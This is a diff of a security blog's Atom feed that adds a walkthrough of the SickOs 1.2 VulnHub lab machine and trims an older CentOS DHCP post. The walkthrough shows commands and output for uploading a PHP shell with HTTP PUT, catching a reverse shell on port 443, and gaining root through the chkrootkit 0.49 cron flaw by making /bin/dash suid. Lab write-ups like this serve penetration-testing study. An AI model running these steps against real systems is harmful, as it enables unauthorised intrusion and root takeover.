@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-07-02T09:34:48-04:00</updated>
+  <updated>2017-07-04T06:51:18-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,268 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
+    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
+    <updated>2017-07-03T04:20:13-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p22,80 -sV 192.168.217.146
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-03 09:11 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.146
+</span><span class='line'>Host is up (0.00030s latency).
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>80/tcp open  http    lighttpd 1.4.28</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The web server serves this pic:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/2-blow.jpg" title="web server" alt="webpage"></p>
+
+<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- NOTHING IN HERE ///\\\ --&gt;&gt;&gt;&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>
+
+<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>
+
+<p>First, I needed to verify if PUT is allowed in the first place:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>| http-methods: 
+</span><span class='line'>|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
+</span><span class='line'>|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
+</span><span class='line'>|_  Path tested: /test</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT&#8217;ing things on a server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 80 192.168.217.146 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='/root/Desktop/shell.php'
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-04 04:36 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.146
+</span><span class='line'>Host is up (0.00031s latency).
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>|_http-put: /test/shell.php was successfully created</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 443
+</span><span class='line'>listening on [any] 443 ...
+</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
+</span><span class='line'>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+</span><span class='line'> 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
+</span><span class='line'>$ whoami
+</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -al /etc/cron*
+</span><span class='line'>-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
+</span><span class='line'>
+</span><span class='line'>ls: cannot open directory /etc/cron.d: Permission denied
+</span><span class='line'>/etc/cron.daily:
+</span><span class='line'>total 72
+</span><span class='line'>drwxr-xr-x  2 root root  4096 Apr 12  2016 .
+</span><span class='line'>drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
+</span><span class='line'>-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+</span><span class='line'>-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+</span><span class='line'>-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
+</span><span class='line'>-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+</span><span class='line'>-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
+</span><span class='line'>-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
+</span><span class='line'>-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
+</span><span class='line'>-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+</span><span class='line'>-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
+</span><span class='line'>-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+</span><span class='line'>-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
+</span><span class='line'>-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+</span><span class='line'>-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ chkrootkit -V
+</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>
+
+<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/shells
+</span><span class='line'># /etc/shells: valid login shells
+</span><span class='line'>/bin/sh
+</span><span class='line'>/bin/dash
+</span><span class='line'>/bin/bash
+</span><span class='line'>/bin/rbash
+</span><span class='line'>$ ls -l /bin/*sh
+</span><span class='line'>-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
+</span><span class='line'>-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
+</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash -&gt; bash
+</span><span class='line'>lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh -&gt; dash
+</span><span class='line'>lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh -&gt; busybox</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>
+
+<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat update
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>chmod u+s /bin/dash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I waited a minute for cron to run and got root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ /bin/dash
+</span><span class='line'>/bin/dash
+</span><span class='line'># whoami
+</span><span class='line'>whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span><span class='line'>WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+</span><span class='line'>
+</span><span class='line'>Thanks for giving this try.
+</span><span class='line'>
+</span><span class='line'>@vulnhub: Thanks for hosting this UP!.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ Tomorrow will be cancelled due to lack \
+</span><span class='line'>\ of interest.                           /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[TheHarvester - Kali Linux tools]]></title>
@@ -3161,7 +3423,7 @@ work against other vulnerable SMTP daemons, but this hasn’t been done as of v1
 </span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali</span></code></pre></td></tr></table></div></figure>
 
 
-<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#118;&#117;&#108;&#110;&#105;&#x78;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#55;&#x2e;&#49;&#52;&#50;">&#x76;&#x75;&#x6c;&#x6e;&#x69;&#120;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#49;&#x37;&#x2e;&#x31;&#x34;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>
+<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x76;&#x75;&#108;&#x6e;&#105;&#x78;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#49;&#x34;&#x32;">&#118;&#x75;&#x6c;&#110;&#x69;&#120;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x32;&#49;&#x37;&#46;&#x31;&#52;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -11061,384 +11323,6 @@ as the invoker.</p></blockquote>
 </span><span class='line'>            (__)\       )\/\
 </span><span class='line'>                ||----w |
 </span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DHCP server on CentOS]]></title>
-    <link href="http://chousensha.github.io/blog/2017/04/13/dhcp-server-on-centos/"/>
-    <updated>2017-04-13T13:59:25-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/04/13/dhcp-server-on-centos</id>
-    <content type="html"><![CDATA[<p>In this post I will continue the series on configuring various servers on the CentOS 7 distribution. Let&rsquo;s see how we can get a DHCP server up and running!</p>
-
-<!-- more -->
-
-
-<h2>Installing DHCP server</h2>
-
-<p>First, we need to intall the server component, which can be done with the <code>yum install dhcp</code> command:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>=====================================================================================================================================================
-</span><span class='line'> Package                       Arch                            Version                                           Repository                     Size
-</span><span class='line'>=====================================================================================================================================================
-</span><span class='line'>Installing:
-</span><span class='line'> dhcp                          x86_64                          12:4.2.5-47.el7.centos                            base                          511 k
-</span><span class='line'>
-</span><span class='line'>Transaction Summary
-</span><span class='line'>=====================================================================================================================================================
-</span><span class='line'>Install  1 Package
-</span><span class='line'>
-</span><span class='line'>Total download size: 511 k
-</span><span class='line'>Installed size: 1.4 M
-</span><span class='line'>Is this ok [y/d/N]: y
-</span><span class='line'>Downloading packages:
-</span><span class='line'>dhcp-4.2.5-47.el7.centos.x86_64.rpm                                                                                           | 511 kB  00:00:00     
-</span><span class='line'>Running transaction check
-</span><span class='line'>Running transaction test
-</span><span class='line'>Transaction test succeeded
-</span><span class='line'>Running transaction
-</span><span class='line'>  Installing : 12:dhcp-4.2.5-47.el7.centos.x86_64                                                                                                1/1
-</span><span class='line'>  Verifying  : 12:dhcp-4.2.5-47.el7.centos.x86_64                                                                                                1/1
-</span><span class='line'>
-</span><span class='line'>Installed:
-</span><span class='line'>  dhcp.x86_64 12:4.2.5-47.el7.centos                                                                                                                 
-</span><span class='line'>
-</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We now have a <code>/etc/dhcp/dhcpd.conf</code> file for configuring the server. There isn&rsquo;t much in it to start with, except pointers to the <code>dhcpd.conf</code> man page and a sample config file in <code>/usr/share/doc/dhcp*/dhcpd.conf.example</code>:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># dhcpd.conf
-</span><span class='line'>#
-</span><span class='line'># Sample configuration file for ISC dhcpd
-</span><span class='line'>#
-</span><span class='line'>
-</span><span class='line'># option definitions common to all supported networks...
-</span><span class='line'>option domain-name "example.org";
-</span><span class='line'>option domain-name-servers ns1.example.org, ns2.example.org;
-</span><span class='line'>
-</span><span class='line'>default-lease-time 600;
-</span><span class='line'>max-lease-time 7200;
-</span><span class='line'>
-</span><span class='line'># Use this to enble / disable dynamic dns updates globally.
-</span><span class='line'>#ddns-update-style none;
-</span><span class='line'>
-</span><span class='line'># If this DHCP server is the official DHCP server for the local
-</span><span class='line'># network, the authoritative directive should be uncommented.
-</span><span class='line'>#authoritative;
-</span><span class='line'>
-</span><span class='line'># Use this to send dhcp log messages to a different log file (you also
-</span><span class='line'># have to hack syslog.conf to complete the redirection).
-</span><span class='line'>log-facility local7;
-</span><span class='line'>
-</span><span class='line'># No service will be given on this subnet, but declaring it helps the
-</span><span class='line'># DHCP server to understand the network topology.
-</span><span class='line'>
-</span><span class='line'>subnet 10.152.187.0 netmask 255.255.255.0 {
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'># This is a very basic subnet declaration.
-</span><span class='line'>
-</span><span class='line'>subnet 10.254.239.0 netmask 255.255.255.224 {
-</span><span class='line'>  range 10.254.239.10 10.254.239.20;
-</span><span class='line'>  option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'># This declaration allows BOOTP clients to get dynamic addresses,
-</span><span class='line'># which we don't really recommend.
-</span><span class='line'>
-</span><span class='line'>subnet 10.254.239.32 netmask 255.255.255.224 {
-</span><span class='line'>  range dynamic-bootp 10.254.239.40 10.254.239.60;
-</span><span class='line'>  option broadcast-address 10.254.239.31;
-</span><span class='line'>  option routers rtr-239-32-1.example.org;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'># A slightly different configuration for an internal subnet.
-</span><span class='line'>subnet 10.5.5.0 netmask 255.255.255.224 {
-</span><span class='line'>  range 10.5.5.26 10.5.5.30;
-</span><span class='line'>  option domain-name-servers ns1.internal.example.org;
-</span><span class='line'>  option domain-name "internal.example.org";
-</span><span class='line'>  option routers 10.5.5.1;
-</span><span class='line'>  option broadcast-address 10.5.5.31;
-</span><span class='line'>  default-lease-time 600;
-</span><span class='line'>  max-lease-time 7200;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'># Hosts which require special configuration options can be listed in
-</span><span class='line'># host statements.   If no address is specified, the address will be
-</span><span class='line'># allocated dynamically (if possible), but the host-specific information
-</span><span class='line'># will still come from the host declaration.
-</span><span class='line'>
-</span><span class='line'>host passacaglia {
-</span><span class='line'>  hardware ethernet 0:0:c0:5d:bd:95;
-</span><span class='line'>  filename "vmunix.passacaglia";
-</span><span class='line'>  server-name "toccata.fugue.com";
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'># Fixed IP addresses can also be specified for hosts.   These addresses
-</span><span class='line'># should not also be listed as being available for dynamic assignment.
-</span><span class='line'># Hosts for which fixed IP addresses have been specified can boot using
-</span><span class='line'># BOOTP or DHCP.   Hosts for which no fixed address is specified can only
-</span><span class='line'># be booted with DHCP, unless there is an address range on the subnet
-</span><span class='line'># to which a BOOTP client is connected which has the dynamic-bootp flag
-</span><span class='line'># set.
-</span><span class='line'>host fantasia {
-</span><span class='line'>  hardware ethernet 08:00:07:26:c0:a5;
-</span><span class='line'>  fixed-address fantasia.fugue.com;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'># You can declare a class of clients and then do address allocation
-</span><span class='line'># based on that.   The example below shows a case where all clients
-</span><span class='line'># in a certain class get addresses on the 10.17.224/24 subnet, and all
-</span><span class='line'># other clients get addresses on the 10.0.29/24 subnet.
-</span><span class='line'>
-</span><span class='line'>class "foo" {
-</span><span class='line'>  match if substring (option vendor-class-identifier, 0, 4) = "SUNW";
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>shared-network 224-29 {
-</span><span class='line'>  subnet 10.17.224.0 netmask 255.255.255.0 {
-</span><span class='line'>    option routers rtr-224.example.org;
-</span><span class='line'>  }
-</span><span class='line'>  subnet 10.0.29.0 netmask 255.255.255.0 {
-</span><span class='line'>    option routers rtr-29.example.org;
-</span><span class='line'>  }
-</span><span class='line'>  pool {
-</span><span class='line'>    allow members of "foo";
-</span><span class='line'>    range 10.17.224.10 10.17.224.250;
-</span><span class='line'>  }
-</span><span class='line'>  pool {
-</span><span class='line'>    deny members of "foo";
-</span><span class='line'>    range 10.0.29.10 10.0.29.230;
-</span><span class='line'>  }
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This is how the config file looks like. We&rsquo;ll use this example as a basis for making our own. Copy the example file and name it <strong>dhcpd.conf</strong> file:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now edit it and make changes according to your network:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># option definitions common to all supported networks...
-</span><span class='line'>option domain-name "localdomain.com";
-</span><span class='line'># DNS server address - look in your /etc/resolv.conf
-</span><span class='line'>option domain-name-servers 192.168.217.2;
-</span><span class='line'>
-</span><span class='line'>default-lease-time 600;
-</span><span class='line'>max-lease-time 7200;
-</span><span class='line'>
